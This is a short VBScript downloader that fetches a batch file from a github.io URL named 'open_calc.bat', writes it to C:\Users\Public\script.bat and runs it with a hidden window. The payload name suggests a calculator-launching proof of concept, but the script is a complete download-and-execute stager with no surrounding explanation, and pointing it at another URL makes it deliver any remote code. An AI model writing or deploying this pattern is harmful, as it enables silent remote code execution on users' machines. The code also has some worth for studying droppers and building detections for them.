url = "https://lueasf.github.io/open_calc.bat"

path = "C:\Users\Public\script.bat"
 
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
objHTTP.Open "GET", url, False
objHTTP.Send()

If objHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile path, 2
    objStream.Close
End If
 
Set objShell = CreateObject("WScript.Shell")
objShell.Run path, 0, False
